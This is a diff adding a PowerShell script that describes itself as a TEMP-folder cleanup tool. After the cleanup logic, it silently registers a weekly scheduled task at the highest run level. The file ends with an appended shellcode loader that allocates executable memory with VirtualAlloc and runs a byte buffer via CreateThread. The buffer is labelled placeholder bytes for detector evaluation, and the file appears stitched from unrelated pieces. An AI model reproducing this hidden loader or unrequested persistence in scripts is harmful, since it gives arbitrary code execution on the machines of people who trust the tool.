@@ -1,0 +1,273 @@
+#Requires -Version 5.1
+<#
+.SYNOPSIS
+    Removes stale scratch files from the current user TEMP folder.
+.DESCRIPTION
+    Selects files older than the configured age and larger than the size
+    threshold, then deletes them from the TEMP folder only.
+    Every candidate is re-checked against the TEMP prefix before removal, so a
+    reparse point cannot redirect the sweep to another location.
+.EXAMPLE
+    .\Invoke-TempCleanup.ps1 -AgeDays 30
+.EXAMPLE
+    .\Invoke-TempCleanup.ps1 -DryRun -Verbose
+.NOTES
+    Author: Platform Engineering
+    Last updated: 2024-08-08
+#>
+
+[CmdletBinding()]
+param(
+    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
+    [Alias('ScratchPath')]
+    [string]$TempRoot = $env:TEMP,
+
+    [Parameter(Mandatory = $false)]
+    [ValidateRange(1, 90)]
+    [int]$AgeDays = 30,
+
+    [int]$MinSizeMB = 10,
+
+    [string]$LogPath = 'C:\Logs\temp-cleanup-2024-12-05.log',
+
+    [switch]$DryRun
+)
+$ErrorActionPreference = 'Stop'
+$culture = [System.Globalization.CultureInfo]::InvariantCulture
+
+if (-not (Test-Path -LiteralPath $TempRoot)) {
+    throw ("Temp path not found: {0}" -f $TempRoot)
+}
+$cutoff = (Get-Date).AddDays(-$AgeDays)
+$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
+$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+$stale = $allFiles | Where-Object {
+    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
+}
+$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+
+Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan
+
+function Write-CleanupLog {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Message,
+
+        [ValidateSet('INFO', 'WARN', 'ERROR')]
+        [string]$Level = 'INFO'
+    )
+
+    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
+    Add-Content -Path $LogPath -Value $line -Encoding UTF8
+    if ($Level -eq 'ERROR') {
+        Write-Host $line -ForegroundColor Red
+    }
+}
+
+& Write-CleanupLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO
+
+foreach ($file in $stale) {
+    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+        continue
+    }
+    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+}
+$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
+    Measure-Object -Property Length -Sum).Sum / 1MB, 1)
+
+$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
+    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
+foreach ($dir in $emptyDirs) {
+    if ($dir.LastWriteTime -lt $cutoff) {
+        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+    }
+}
+
+$byExtension = $stale | Group-Object -Property Extension |
+    Sort-Object -Property Count -Descending | Select-Object -First 5
+$byExtension | Format-Table Name, Count -AutoSize
+
+$report = [pscustomobject]@{
+    TempRoot    = $TempRoot
+    AgeDays     = $AgeDays
+    Files       = @($stale).Count
+    ReclaimedMB = $reclaimMB
+    RemainingMB = $remainingMB
+    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+}
+$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
+$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At '09:00'
+Register-ScheduledTask -TaskName 'Contoso-TempCleanup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
+
+$MailTo = 'ops@adatum.com'
+
+$mailParams = @{
+    To         = $MailTo
+    From       = "ops@adatum.com"
+    Subject    = 'TEMP cleanup summary'
+    Body       = 'The scheduled TEMP sweep completed. See the JSON report on the host.'
+    SmtpServer = 'smtp.adatum.com'
+    Port       = 25
+    UseSsl     = $true
+}
+Send-MailMessage @mailParams
+
+& Write-CleanupLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
+Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green
+
+$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
+Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)
+
+$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
+Write-Verbose ("Session folder: {0}" -f $sessionTemp)
+
+$locked = @($stale | Where-Object { $_.IsReadOnly })
+Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)
+
+$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
+$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize
+
+$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
+if ($tempDrive) {
+    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
+}
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
+
+$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isElevated) {
+    Write-Warning 'Some checks require an elevated session.'
+}
+
+$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
+foreach ($dir in $staleTemp) {
+    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+$runningAsService = $env:SESSIONNAME -eq 'Services'
+Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
+Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())
+
+$culture = [System.Globalization.CultureInfo]::CurrentCulture
+Write-Verbose ("Culture: {0}" -f $culture.Name)
+Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)
+
+$osVersion = [System.Environment]::OSVersion.VersionString
+Write-Verbose ("Operating system: {0}" -f $osVersion)
+Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
+
+$logFolder = Join-Path $env:TEMP 'ops-logs'
+if (-not (Test-Path -LiteralPath $logFolder)) {
+    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
+}
+Write-Verbose ("Log folder: {0}" -f $logFolder)
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+$LogPath = "$env:TEMP\run.log"
+
+try {
+    $NativeCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class NativeApi
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+            uint dwFreeType);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+    "@
+
+    Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
+    $Buffer = [Byte[]] @(
+        0x3c, 0xdb, 0xf1, 0x58, 0x64, 0x8b, 0xd0, 0xde, 0xee, 0x97, 0x57, 0x6b, 0x67, 0x66, 0xe5, 0x0f,
+        0xe1, 0x2c, 0x62, 0x9d, 0xc7, 0x3d, 0x39, 0xca, 0x3c, 0x99, 0x5d, 0x6d, 0x11, 0xf1, 0xac, 0x66,
+        0x0b, 0xc3, 0x43, 0xd7, 0x89, 0x72, 0x02, 0x83, 0xde, 0xd7, 0x16, 0xbe, 0xb8, 0x5a, 0x44, 0xdf,
+        0x80, 0x52, 0xb5, 0x72, 0xd8, 0x28, 0xc8, 0x44, 0x2a, 0x33, 0xd0, 0xff, 0xe2, 0xe4, 0x93, 0xdf,
+        0x93, 0x16, 0x33, 0xf8, 0xf7, 0x84, 0x1c, 0xd2, 0xef, 0x2e, 0x9a, 0xc4, 0x95, 0xa4, 0x11, 0xbe,
+        0xf4, 0x34, 0x82, 0x22, 0x2c, 0xda, 0xba, 0xd6, 0x0a, 0xac, 0xa2, 0xc2, 0x23, 0x24, 0x69, 0xa3,
+        0xc7, 0x15, 0xb0, 0xa5, 0x0f, 0x71, 0x09, 0x53, 0x1a, 0x91, 0xad, 0x58, 0xcb, 0x44, 0x69, 0x35,
+        0x9b, 0xa0, 0xbe, 0x62, 0xb9, 0x9f, 0xd5, 0x6b, 0xeb, 0x55, 0xb6, 0x07, 0x94, 0x49, 0xac, 0x38,
+        0xed, 0x89, 0xab, 0xd9, 0x91, 0x4d, 0x8e, 0x39, 0x37, 0xf9, 0x1d, 0x99, 0x36, 0x16, 0x07, 0xc0,
+        0x5d, 0x3e, 0xb8, 0x07, 0xbd, 0x2c, 0x16, 0x7c, 0xbb, 0x79, 0x7e, 0x87, 0x92, 0x12, 0x30, 0x2d,
+        0xa8, 0x4f, 0xc2, 0x70, 0xce, 0x84, 0x3d, 0x70, 0x5c, 0xdd, 0xc7, 0x8c, 0x9e, 0x5a, 0x80, 0xd5,
+        0x9f, 0xd7, 0x2c, 0x78, 0x27, 0x0a, 0xc4, 0xbb, 0x43, 0xc4, 0xe4, 0xf3, 0xe6, 0xa4, 0xb9, 0x25,
+        0x4c, 0xc1, 0xa0, 0xfb, 0x73, 0x82, 0xcb, 0x5f, 0xdb, 0x10, 0xe0, 0xf7, 0xf1, 0x55, 0x04, 0xb7,
+        0xf7, 0x80, 0x76, 0xa3, 0xef, 0x29, 0x87, 0x2b, 0x5e, 0x86, 0x22, 0x5a, 0x40, 0xc4, 0x2d, 0xd7,
+        0xdd, 0x39, 0xcf, 0x05, 0x25, 0x3d, 0x10, 0xbc, 0x3f, 0x63, 0x82, 0xd8, 0x43, 0xfb, 0xbb, 0xb1,
+        0x00, 0x41, 0x1a, 0x6a, 0x26, 0x60, 0x55, 0x2c, 0xdc, 0xae, 0xcd, 0x35, 0xfe, 0x83, 0xcc, 0x26,
+        0xdf, 0x55, 0xf7, 0x37, 0x09, 0xf9, 0xe9, 0xd1, 0x31, 0x7e, 0xc7, 0xf6, 0xd9, 0x9c, 0xe4, 0x1a,
+        0x70, 0x08, 0x1f, 0xfc, 0xb7, 0xe4, 0x68, 0xbd, 0x2e, 0x7a, 0x8e, 0x99, 0xdf, 0x69, 0x20, 0xf5,
+        0x58, 0xf6, 0xf4, 0x93, 0x49, 0x8c, 0xf5, 0xb9, 0xf7, 0x9a, 0x81, 0x1b, 0x21, 0xb4, 0xe3, 0xac,
+        0x4f, 0x67, 0x52, 0xc7, 0xf9, 0x87, 0x97, 0x41, 0x73, 0xdd, 0xf0, 0x11, 0x46, 0x0f, 0x0b, 0x50,
+        0xe9, 0xe4, 0xcd, 0x2e, 0x4d, 0x59, 0x1d, 0xfa, 0xb0, 0x79, 0x20, 0xce, 0x19, 0xae, 0xc1, 0x3f,
+        0xe5, 0x09, 0x4b, 0xb7, 0x91, 0x87, 0x6e, 0xb8, 0x3c, 0x53, 0x4d, 0xdf, 0xfb, 0xab, 0xb2, 0x0a,
+        0xaf, 0x8d, 0x23, 0xf2, 0x0c, 0xb3, 0x22, 0x3d, 0x3e, 0xec, 0xc5, 0x0b, 0xce, 0x68, 0x19, 0x6a,
+        0xd2, 0x9f, 0xfc, 0xf8, 0xec, 0xe0, 0xe5, 0xee, 0x7d, 0x8c, 0xdd, 0x9b, 0xc7, 0xae, 0xcb, 0x6b,
+        0x05, 0xd3, 0x7e, 0xc1, 0x3a, 0xc9, 0x17, 0xcb, 0x30, 0x63, 0x78, 0x69, 0x9f, 0x54, 0xd7, 0x03,
+        0xe4, 0x72, 0xe6, 0xb7, 0x0f, 0xb6, 0xb1, 0x4c, 0xde, 0xff, 0x22, 0x6f, 0xa5, 0x3e, 0xf5, 0xf8,
+        0xab, 0x99, 0x47, 0x73, 0x86, 0xa1, 0x1c, 0xd5, 0x20, 0x4b, 0x6d, 0xfa, 0x25, 0x1a, 0x91, 0xe6,
+        0xe8, 0xff, 0x38, 0xb4, 0x2d, 0x57, 0xc6, 0x54, 0x44, 0xd9, 0x0c, 0xce, 0x45, 0x75, 0xbf, 0xdd,
+        0x00, 0x4c, 0x1a, 0x74, 0x31, 0xa9, 0xb6, 0xf8, 0x6f, 0x86, 0xcf, 0x3d, 0xc6, 0xeb, 0x3d, 0x61,
+        0x36, 0xf1, 0x0a, 0xb3, 0x07, 0x0e, 0xd5, 0xd3, 0x34, 0xb6, 0x84, 0x83, 0x38, 0xf4, 0x99, 0x73,
+        0xde, 0x44, 0xc9, 0xaa, 0x57, 0x49, 0x2e, 0x0a, 0xe8, 0x65, 0xf6, 0x08, 0x77, 0x64, 0x7e, 0x9f,
+        0xef, 0x82, 0x64, 0x75, 0xeb, 0x0c, 0x5c, 0xd0, 0x06, 0x18, 0xf2, 0x48, 0x5f, 0xb6, 0x62, 0xf7,
+        0x91, 0x3b, 0x24, 0x37, 0x44, 0x26, 0x47, 0xf8, 0xb6, 0xb5, 0x05, 0xb5, 0x0e, 0x40, 0x8a, 0xaa,
+        0xd2, 0xbb, 0xf0, 0xf2, 0x96, 0x6c, 0xe5, 0xf5, 0xc7, 0xcd, 0xed, 0xea, 0x9d, 0xed, 0xbb, 0xe0,
+        0xc9, 0x0d, 0x5f, 0xde, 0x97, 0x58, 0x48, 0xbd, 0xcb, 0x63, 0xbe
+    )
+
+    $ProcHandle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+    if ($ProcHandle -eq [IntPtr]::Zero) {
+        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        return
+    }
+
+    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
+    $ThreadId = 0
+    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+    [void][NativeApi]::WaitForSingleObject($Thread, 2231)
+    [void][NativeApi]::CloseHandle($Thread)
+
+    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+}
+catch {
+    Write-Warning "loader failed: $($_.Exception.Message)"
+}
